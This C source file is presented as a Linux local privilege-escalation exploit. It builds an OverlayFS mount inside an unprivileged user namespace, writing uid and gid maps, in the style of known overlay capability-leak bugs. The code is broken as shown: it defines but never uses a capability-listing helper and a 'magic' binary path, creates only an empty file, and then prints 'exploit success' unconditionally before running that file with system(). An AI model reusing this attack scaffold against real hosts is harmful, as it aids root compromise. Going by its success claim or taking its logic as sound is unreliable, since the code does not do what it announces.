#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mount.h>
#include <sys/capability.h>

#define DIR_BASE "./ovlcap"
#define DIR_WORK DIR_BASE "/work"
#define DIR_LOWER DIR_BASE "/lower"
#define DIR_UPPER DIR_BASE "/upper"
#define DIR_MERGE DIR_BASE "/merge"
#define BIN_MERGE DIR_MERGE "/magic"
#define BIN_UPPER DIR_UPPER "/magic"

// Utility function to create directories, handling errors
static void xmkdir(const char *path, mode_t mode) {
    if (mkdir(path, mode) == -1 && errno != EEXIST) {
        err(1, "mkdir %s", path);
    }
}

// Utility function to write data to a file
static void xwritefile(const char *path, const char *data) {
    int fd = open(path, O_WRONLY);
    if (fd == -1) {
        err(1, "open %s", path);
    }
    ssize_t len = (ssize_t)strlen(data);
    if (write(fd, data, len) != len) {
        err(1, "write %s", path);
    }
    close(fd);
}

// Utility function to read and display the content of a file
static void xreadfile(const char *path) {
    int fd = open(path, O_RDONLY);
    if (fd == -1) {
        err(1, "open %s", path);
    }
    int len = 0;
    char data[0x100];
    while (read(fd, data + len, 1) > 0) {
        len++;
    }
    data[len] = '\0';
    puts(data);
    printf("len %d\n", len);
    close(fd);
}

// List current process capabilities
void listCaps() {
    cap_t caps = cap_get_proc(); // Get current capabilities
    ssize_t y = 0;
    printf("The process %d was given capabilities %s\n", (int)getpid(), cap_to_text(caps, &y));
    fflush(0);
    cap_free(caps); // Free allocated memory for capabilities
}

// Function containing the exploit logic
static int exploit() {
    char buf[4096];

    // Clean and set up overlay directories
    sprintf(buf, "rm -rf '%s/*'", DIR_UPPER);
    system(buf); // Clear upper directory
    xmkdir(DIR_BASE, 0777);
    xmkdir(DIR_WORK, 0777);
    xmkdir(DIR_LOWER, 0777);
    xmkdir(DIR_UPPER, 0777);
    xmkdir(DIR_MERGE, 0777);

    // Mount the overlay filesystem
    uid_t uid = getuid(); // Get current user ID
    gid_t gid = getgid(); // Get current group ID
    printf("uid:%d gid:%d\n", uid, gid);

    // Unshare the namespace (create isolated environment)
    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1) {
        err(1, "unshare");
    }

    // Set user and group mappings for the new user namespace
    xwritefile("/proc/self/setgroups", "deny");
    sprintf(buf, "0 %d 1", uid);
    xwritefile("/proc/self/uid_map", buf);
    sprintf(buf, "0 %d 1", gid);
    xwritefile("/proc/self/gid_map", buf);

    // Construct overlay mount options
    sprintf(buf, "lowerdir=%s,upperdir=%s,workdir=%s", DIR_LOWER, DIR_UPPER, DIR_WORK);
    if (mount("overlay", DIR_MERGE, "overlay", 0, buf) == -1) {
        err(1, "mount %s", DIR_MERGE);
    } else {
        puts("[+] mount success");
    }

    // Debug: List contents of the merged directory
    sprintf(buf, "ls -la %s", DIR_MERGE);
    system(buf);

    // Create a file in the merged directory
    sprintf(buf, "%s/file", DIR_MERGE);
    int fd = open(buf, O_WRONLY | O_CREAT, 0666); // Create file with write permissions
    if (fd < 0) {
        perror("open");
    }
    close(fd);

    return 0;
}

int main(int argc, char *argv[]) {
    int pid = fork(); // Create a child process
    int stat;
    if (pid == 0) {
        // Child process: Execute the exploit
        exploit();
        exit(0);
    }
    // Parent process: Wait for the child to complete
    wait(&stat);

    // Post-exploit: Attempt to use the modified filesystem
    puts("[+] exploit success!");
    char buf[0x100];
    sprintf(buf, "%s/file", DIR_UPPER);
    system(buf); // Attempt to execute the file in the upper directory

    return 0;
}